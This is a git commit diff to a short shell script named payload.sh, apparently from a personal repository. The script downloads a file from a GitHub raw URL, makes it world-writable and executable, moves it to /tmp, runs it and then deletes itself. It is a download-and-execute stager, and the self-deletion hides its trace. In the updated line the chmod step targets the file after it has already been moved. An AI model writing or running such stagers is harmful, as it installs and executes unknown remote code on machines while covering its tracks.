a3da8cc41c68996459323e790720afbfb2722816
b4ldrrr <artelia.yeve@gmail.com>
2024-06-26 13:35:21 +0200

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 
 #Test
-wget 'https://raw.githubusercontent.com/b4ldrrr/web2/main/testmayoly'; chmod 777 ./testmayoly; mv ./testmayoly /tmp/testmayoly; /tmp/testmayoly
+wget 'https://raw.githubusercontent.com/b4ldrrr/web2/main/testmayoly'; mv ./testmayoly /tmp/testmayoly; chmod 777 ./testmayoly; /tmp/testmayoly
 
 rm ./payload.sh
